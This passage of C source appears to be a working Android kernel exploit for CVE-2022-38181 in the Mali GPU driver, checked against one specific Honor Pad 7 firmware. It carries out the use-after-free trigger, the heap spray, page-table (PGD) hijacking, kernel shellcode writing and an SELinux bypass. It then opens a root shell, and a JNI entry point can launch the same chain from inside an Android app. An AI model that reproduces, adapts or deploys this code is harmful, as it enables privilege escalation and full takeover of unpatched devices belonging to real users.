                                     info_gpu, (uint64_t *)info_cpu);
    atom_number++;
    if (jit_addr == 0 || (jit_addr & 0xFFF) != 0 || jit_addr < 0x1000) {
        LOG("[-] jit alloc bad result %llx (soft job failed?), cleaning up\n",
            (unsigned long long)jit_addr);
        jit_free(mali_fd, atom_number++, jit_id);
        jit_id++;
        return -1;
    }
    LOG("[*] jit addr %llx\n", (unsigned long long)jit_addr);
    mem_flags_change(mali_fd, jit_addr, BASE_MEM_DONT_NEED);

    const char *pressure_path = getenv("PRESSURE_FILE");
    if (pressure_path && prime_file_lru(pressure_path) < 0)
        return -2;

    for (int i = 0; i < NUM_TRIALS; i++) {
        union kbase_ioctl_mem_query query = { 0 };
        query.in.gpu_addr = jit_addr;
        query.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
        int slot = flush_idx++;
        flush_regions[slot] = do_flush(i + slot);
        long available = mem_available_kb();
        if (available >= 0 && available <= MIN_AVAILABLE_KB) {
            LOG("[-] safety stop: MemAvailable=%ldkB\n", available);
            return -2;
        }
        int qrc = ioctl(mali_fd, KBASE_IOCTL_MEM_QUERY, &query);
        if (qrc < 0 || query.out.value != SPRAY_PAGES) {
            LOG("[+] reclaim detected at trial %d: qrc=%d commit=%llu\n",
                i, qrc, (unsigned long long)query.out.value);
            if (qrc == 0 && wait_region_gone(mali_fd, jit_addr) < 0) {
                LOG("[-] timed out waiting for the old JIT region to disappear\n");
                return -2;
            }
            LOG("[*] old JIT region disappeared; waiting for destroy completion\n");
            usleep(50000);
            LOG("[*] starting replacement spray\n");
            if (migrate_to_cpu(SPRAY_CPU) != 0)
                LOG("[!] failed to bind replacement spray to CPU%d\n", SPRAY_CPU);
            spray(mali_fd);
            uint64_t alias_gpu = alias_sprayed_regions(mali_fd);
            fault_pages();
            free_flush_regions();
            LOG("[stage] alias faulted and flush regions released\n");

            void *drain = drain_mem_pool(mali_fd);
            LOG("[stage] post-alias drain mapped: %p\n", drain);
            release_mem_pool(mali_fd, drain);
            LOG("[stage] post-alias drain unmapped; submitting second JIT_FREE\n");
            uint8_t free_atom = atom_number++;
            jit_free(mali_fd, free_atom, jit_id);
            if (wait_softjob_event(mali_fd, free_atom) < 0) {
                LOG("[-] second JIT_FREE did not complete successfully\n");
                return -2;
            }
            LOG("[stage] second JIT_FREE completed; waiting for commit=0\n");
            if (wait_spray_released(mali_fd) < 0) {
                LOG("[-] timed out waiting for replacement backing release\n");
                return -2;
            }

            int pre_idx = -1;
            int pre_pgd = find_pgd(mali_fd, &pre_idx);
            if (pre_pgd >= 0) {
                LOG("[-] candidate existed before map_reserved (slot %d page %d)\n",
                    pre_idx, pre_pgd);
                return -2;
            }

            map_reserved(mali_fd2, RESERVED_SIZE, TOTAL_RESERVED_SIZE / RESERVED_SIZE);
            LOG("[*] replacement released; reserved mappings created\n");

            int freed_idx = -1;
            int pgd_idx = find_pgd(mali_fd, &freed_idx);
            if (pgd_idx < 0) {
                LOG("[-] failed to find a validated PGD page; stopping\n");
                return -2;
            }
            g_pgd = alias_gpu + (uint64_t)pgd_idx * PAGE_SIZE
                  + (uint64_t)freed_idx * (SPRAY_PAGES * PAGE_SIZE);
            g_pgd_slot = freed_idx;
            g_pgd_page = pgd_idx;
            LOG("[+] PGD FOUND AFTER MAP: gpu %llx (slot %d page %d)\n",
                (unsigned long long)g_pgd, freed_idx, pgd_idx);
            return 0;
        }
    }
    LOG("[-] trial failed; keeping flush pressure for the next attempt\n");
    jit_id++;
    return -1;
}

static void check_target(void)
{
    char fingerprint[PROP_VALUE_MAX] = { 0 };
    char patch[PROP_VALUE_MAX] = { 0 };
    __system_property_get("ro.build.fingerprint", fingerprint);
    __system_property_get("ro.build.version.security_patch", patch);
    if (!strstr(fingerprint, "AGM3-W09HN") ||
        !strstr(fingerprint, "11.0.2.197") ||
        strcmp(patch, "2022-04-01") != 0)
        errx(1, "unsupported target: %s / SPL %s", fingerprint, patch);
}

static void trigger_enforce_read(void)
{
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd < 0) {
        LOG("[-] open enforce failed: errno=%d\n", errno);
        return;
    }
    char value;
    ssize_t n = read(fd, &value, 1);
    LOG("[*] enforce read result=%zd errno=%d\n", n, errno);
    close(fd);
}

#ifdef SHELL
int main(int argc, char **argv)
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    int max_attempts = argc > 1 ? atoi(argv[1]) : 1;
    if (max_attempts != 1)
        errx(1, "only one JIT/context per process is supported");
    check_target();

    LOG("[*] Honor Pad 7 AGM3-W09HN — CVE-2022-38181 (Mali r20p0, kernel 4.14.141)\n");
    LOG("[*] KERNEL_BASE=%llx avc=%llx sre=%llx pkc=%llx cc=%llx\n",
        (unsigned long long)KERNEL_BASE,
        (unsigned long long)(KERNEL_BASE + AVC_DENY_OFF),
        (unsigned long long)(KERNEL_BASE + SEL_READ_ENFORCE_OFF),
        (unsigned long long)(KERNEL_BASE + PREPARE_KERNEL_CRED_OFF),
        (unsigned long long)(KERNEL_BASE + COMMIT_CREDS_OFF));
    build_root_code();
#ifdef TEST_MODE
#ifdef VERIFY_PGD_WRITE
    LOG("[*] TEST_MODE: idempotent PGD write verification enabled\n");
#else
    LOG("[*] TEST_MODE: no WRITE_VALUE kernel writes will be performed\n");
#endif
#endif

    int mali_fd = open_dev(MALI);
    setup_mali(mali_fd);
    setup_tracking_page(mali_fd);
    jit_init(mali_fd, 0x1000);

    int mali_fd2 = open_dev(MALI);
    setup_mali(mali_fd2);
    setup_tracking_page(mali_fd2);
    uint64_t drain_cookie = drain_mem_pool_pending(mali_fd2);
    release_mem_pool_pending(mali_fd2, drain_cookie);
    reserve_pages(mali_fd2, RESERVED_SIZE, TOTAL_RESERVED_SIZE / RESERVED_SIZE);

    for (int i = 0; i < max_attempts; i++) {
        int rc = trigger(mali_fd, mali_fd2);
        if (rc == -2)
            break;
        if (rc >= 0) {
#ifdef TEST_MODE
#ifdef VERIFY_PGD_WRITE
            write_to(mali_fd, g_pgd + OVERWRITE_INDEX * sizeof(uint64_t),
                     g_pgd_orig, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
            usleep(100000);
            uint64_t *pgd_view = (uint64_t *)alias_regions[g_pgd_slot];
            uint64_t observed = pgd_view[g_pgd_page * (PAGE_SIZE / 8) + OVERWRITE_INDEX];
            if (observed != g_pgd_orig) {
                LOG("[-] PGD write verification failed: %llx != %llx\n",
                    (unsigned long long)observed,
                    (unsigned long long)g_pgd_orig);
                return 1;
            }
            LOG("[+] IDEMPOTENT PGD WRITE VERIFIED\n");
#endif
            LOG("[+] TEST PASSED — PGD primitive verified\n");
            unmap_spray();
            return 0;
#else
            write_shellcode(mali_fd, mali_fd2, g_pgd);
            cleanup_pgd(mali_fd, g_pgd);
            trigger_enforce_read();
            uid_t u = getuid();
            uid_t e = geteuid();
            LOG("[*] uid after trigger: %u euid: %u (0 = root)\n", u, e);
            if (u == 0 && e == 0) {
                LOG("[+] ROOT (temporary, this process only)\n");
                execl("/system/bin/sh", "sh", NULL);
                err(1, "failed to exec root shell");
            }
            return 1;
#endif
        }
    }
    return 1;
}
#else
#include <jni.h>
JNIEXPORT int JNICALL
Java_com_example_hellojni_MaliExpService_stringFromJNI(JNIEnv *env, jobject thiz)
{
    (void)env; (void)thiz;
    check_target();
    build_root_code();
    int mali_fd = open_dev(MALI);
    setup_mali(mali_fd);
    setup_tracking_page(mali_fd);
    jit_init(mali_fd, 0x1000);
    int mali_fd2 = open_dev(MALI);
    setup_mali(mali_fd2);
    setup_tracking_page(mali_fd2);
    uint64_t drain_cookie = drain_mem_pool_pending(mali_fd2);
    release_mem_pool_pending(mali_fd2, drain_cookie);
    reserve_pages(mali_fd2, RESERVED_SIZE, TOTAL_RESERVED_SIZE / RESERVED_SIZE);
    if (trigger(mali_fd, mali_fd2) >= 0) {
#ifndef TEST_MODE
        write_shellcode(mali_fd, mali_fd2, g_pgd);
        cleanup_pgd(mali_fd, g_pgd);
        trigger_enforce_read();
#endif
        unmap_spray();
        return getuid() == 0 && geteuid() == 0 ? 0 : -1;
    }
    return -1;
}
#endif
